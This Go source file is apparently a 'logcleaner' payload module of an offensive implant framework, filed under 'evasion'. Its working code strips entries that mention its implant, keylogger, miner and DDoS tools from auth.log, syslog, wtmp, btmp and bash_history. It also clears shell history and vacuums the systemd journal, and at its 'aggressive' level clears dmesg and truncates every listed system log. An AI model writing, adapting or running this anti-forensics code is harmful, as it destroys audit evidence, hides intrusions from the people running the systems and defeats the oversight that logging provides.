package payloads

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

func init() {
	Register(&LogCleaner{})
}

type LogCleaner struct{}

func (l *LogCleaner) Name() string     { return "logcleaner" }
func (l *LogCleaner) Category() string { return "evasion" }
func (l *LogCleaner) Description() string {
	return "Clean system logs (auth.log, syslog, journald, wtmp, btmp, bash_history)"
}

func (l *LogCleaner) Execute(args map[string]string) ([]byte, error) {
	level := args["level"]
	if level == "" {
		level = "moderate"
	}
	result := l.clean(level)
	return MarshalJSON(result)
}

type logcleanResult struct {
	Timestamp  string         `json:"timestamp"`
	Level      string         `json:"clean_level"`
	Operations []logOperation `json:"operations"`
	Summary    map[string]int `json:"summary"`
}

type logOperation struct {
	File    string `json:"file"`
	Status  string `json:"status"`
	Removed int    `json:"removed"`
	Error   string `json:"error,omitempty"`
}

var logPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)rogue_implant`),
	regexp.MustCompile(`(?i)rogue_agent`),
	regexp.MustCompile(`(?i)\.cache/\.rogue`),
	regexp.MustCompile(`(?i)polyloader`),
	regexp.MustCompile(`(?i)ddos\.py`),
	regexp.MustCompile(`(?i)mine\.py`),
	regexp.MustCompile(`(?i)keylogger`),
	regexp.MustCompile(`(?i)screenshot`),
}

var linuxLogFiles = []string{
	"/var/log/auth.log",
	"/var/log/syslog",
	"/var/log/messages",
	"/var/log/secure",
	"/var/log/kern.log",
	"/var/log/dmesg",
	"/var/log/boot.log",
	"/var/log/cron",
	"/var/log/maillog",
	"/var/log/lastlog",
	"/var/log/wtmp",
	"/var/log/btmp",
	"/var/log/faillog",
}

func (l *LogCleaner) clean(level string) *logcleanResult {
	r := &logcleanResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Level:     level,
	}

	// Always clean app logs and bash history
	r.Operations = append(r.Operations, l.cleanBashHistory()...)

	if level == "moderate" || level == "aggressive" {
		r.Operations = append(r.Operations, l.cleanSystemLogs()...)
	}

	if level == "aggressive" {
		r.Operations = append(r.Operations, l.cleanMemoryLogs()...)
		r.Operations = append(r.Operations, l.aggressiveCleanup()...)
	}

	totalRemoved := 0
	totalErrors := 0
	for _, op := range r.Operations {
		totalRemoved += op.Removed
		if op.Status == "error" {
			totalErrors++
		}
	}

	r.Summary = map[string]int{
		"total_operations":    len(r.Operations),
		"total_lines_removed": totalRemoved,
		"total_errors":        totalErrors,
	}

	return r
}

func (l *LogCleaner) cleanBashHistory() []logOperation {
	var ops []logOperation

	home, _ := os.UserHomeDir()
	historyFiles := []string{
		filepath.Join(home, ".bash_history"),
		"/root/.bash_history",
	}

	for _, f := range historyFiles {
		ops = append(ops, l.cleanFile(f))
	}

	// Clear current session history
	exec.Command("history", "-c").Run()
	exec.Command("history", "-w").Run()

	return ops
}

func (l *LogCleaner) cleanSystemLogs() []logOperation {
	var ops []logOperation
	for _, logFile := range linuxLogFiles {
		ops = append(ops, l.cleanFile(logFile))
	}
	return ops
}

func (l *LogCleaner) cleanFile(filepath string) logOperation {
	op := logOperation{File: filepath}

	data, err := os.ReadFile(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			op.Status = "not_found"
		} else {
			op.Status = "error"
			op.Error = err.Error()
		}
		return op
	}

	originalLines := strings.Split(string(data), "\n")
	var newLines []string
	for _, line := range originalLines {
		match := false
		for _, pattern := range logPatterns {
			if pattern.MatchString(line) {
				match = true
				break
			}
		}
		if !match {
			newLines = append(newLines, line)
		}
	}

	removed := len(originalLines) - len(newLines)
	if removed > 0 {
		// Backup original
		backupPath := filepath + ".rogue_backup"
		os.WriteFile(backupPath, data, 0600)
		os.WriteFile(filepath, []byte(strings.Join(newLines, "\n")), 0644)
		op.Status = "cleaned"
		op.Removed = removed
	} else {
		op.Status = "no_matches"
		op.Removed = 0
	}

	return op
}

func (l *LogCleaner) cleanMemoryLogs() []logOperation {
	var ops []logOperation

	// Journalctl
	if _, err := exec.LookPath("journalctl"); err == nil {
		if err := exec.Command("journalctl", "--vacuum-time=1s").Run(); err == nil {
			_ = exec.Command("journalctl", "--rotate").Run()
			ops = append(ops, logOperation{
				File:   "systemd_journal",
				Status: "cleaned",
			})
		}
	}

	// dmesg (best effort - may require privileges)
	if _, err := exec.LookPath("dmesg"); err == nil {
		if err := exec.Command("dmesg", "-c").Run(); err == nil {
			ops = append(ops, logOperation{
				File:   "dmesg",
				Status: "cleaned",
			})
		}
	}

	return ops
}

func (l *LogCleaner) aggressiveCleanup() []logOperation {
	var ops []logOperation
	// Truncate system log files
	for _, logFile := range linuxLogFiles {
		if _, err := os.Stat(logFile); err == nil {
			os.Truncate(logFile, 0)
			ops = append(ops, logOperation{
				File:   logFile,
				Status: "truncated",
			})
		}
	}
	return ops
}
